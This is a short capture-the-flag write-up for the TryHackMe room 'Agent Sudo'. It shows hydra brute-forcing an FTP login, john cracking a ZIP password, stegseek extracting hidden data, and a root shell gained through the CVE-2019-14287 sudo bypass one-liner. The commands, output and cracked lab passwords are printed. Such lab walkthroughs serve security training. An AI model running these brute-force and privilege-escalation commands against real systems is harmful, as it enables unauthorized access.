---
title: Agent Sudo
description: Password attack with hydra and stegseek
pubDate: 2024-01-04
category: 'tryhackme'
tags: ['hydra', 'binwalk']
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/aedc6b66c222e15ff740c282a0c3f44e.png'
---

User-Agent: C
Redirect to: agent_C_attention.php

Has a reference to agent J

Agent C (chris) has a weak password, we can probably use hydra to brute force FTP access.

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.187.34
...snip...
[21][ftp] host: 10.10.187.34   login: chris   password: crystal
...snip...
```

```bash
binwalk -e cutie.png
```
This outputs a ZIP file which has a password, we can crack it with John

```bash
zip2john 8702.zip > zip_hash
john zip_hash --wordlist /usr/share/wordlists/rockyou.txt
...snip...
alien            (8702.zip/To_agentR.txt)
```

```bash
stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt
...snip..
[i] Found passphrase: "Area51"
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".
```

The incident is called: Roswell alien autopsy

CVE-2019-14287
```bash
sudo -u \#$((0xffffffff)) /bin/bash
```

OR:

```bash
systemd-run -t /bin/bash # <-- password: hackerrules!
```
